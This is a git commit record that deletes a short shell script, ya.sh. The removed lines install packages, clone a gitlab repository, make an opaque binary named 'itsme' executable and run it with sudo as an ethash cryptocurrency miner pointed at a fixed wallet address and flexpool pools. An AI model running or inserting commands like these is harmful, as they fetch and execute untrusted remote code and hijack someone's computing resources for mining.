59303c81d1b1adac87ed919ad117ef51bdef07d8
Treecommon <103907893+Treecommon@users.noreply.github.com>
2022-04-22 12:11:43 +0700

    Delete ya.sh

--- ya.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/sh
-sudo apt update
-sudo apt-get install zip unzip
-sudo apt install screen -y
-screen -dmS sahuman.sh 65 75
-sudo git clone https://gitlab.com/taufiqurrohmanmaz/sainame127.git
-cd sainame127
-chmod +x itsme
-ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./itsme -a ethash -w 0x0F8824d694772df58840EDdD06a36526A0063438 -p stratum+tcp://eth-sg.flexpool.io:4444 stratum+tcp://eth-hke.flexpool.io -r $ip --nvidia 1
